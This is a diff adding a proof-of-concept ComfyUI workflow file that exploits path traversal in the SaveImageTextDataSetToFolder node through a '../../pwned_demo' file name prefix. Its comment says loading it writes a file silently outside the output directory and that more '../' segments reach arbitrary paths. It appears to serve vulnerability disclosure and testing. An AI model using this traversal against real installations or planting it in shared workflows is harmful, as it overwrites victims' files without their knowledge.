@@ -1,0 +1,17 @@
+{
+  "_comment": "PoC workflow (API format) for the SaveImageTextDataSetToFolder filename_prefix traversal. BENIGN DEMO: writes <comfy_base>/pwned_demo_00000.txt, i.e. one level above output/dataset into the install root. Importing+running this file executes silently. Extend 'filename_prefix' with more ../ segments (or an absolute path) for arbitrary targets. Authorized testing only.",
+  "1": {
+    "class_type": "EmptyImage",
+    "inputs": { "width": 16, "height": 16, "color": 16711680, "batch_size": 1 }
+  },
+  "2": {
+    "class_type": "SaveImageTextDataSetToFolder",
+    "inputs": {
+      "images": ["1", 0],
+      "texts": "ComfyUI path-traversal PoC: this file was written outside the output directory by merely loading a workflow.",
+      "folder_name": "dataset",
+      "filename_prefix": "../../pwned_demo",
+      "mode": "overwrite"
+    }
+  }
+}
